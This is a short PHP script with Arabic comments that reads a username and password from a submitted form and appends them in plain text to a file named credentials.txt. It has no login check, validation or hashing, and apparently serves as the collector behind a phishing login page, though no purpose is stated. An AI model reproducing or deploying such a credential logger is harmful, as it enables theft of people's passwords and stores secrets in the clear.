<?php

// التحقق من إرسال المدخلات بطريقة POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  // تلقي المدخلات من النموذج
  $username = $_POST['username'];
  $password = $_POST['password'];

  // فتح الملف للكتابة في النهاية
  $file = fopen("credentials.txt", "a");

  // إضافة المدخلات الجديدة إلى الملف
  fwrite($file, $username . "," . $password . "\n");

  // إغلاق الملف
  fclose($file);
}

?>
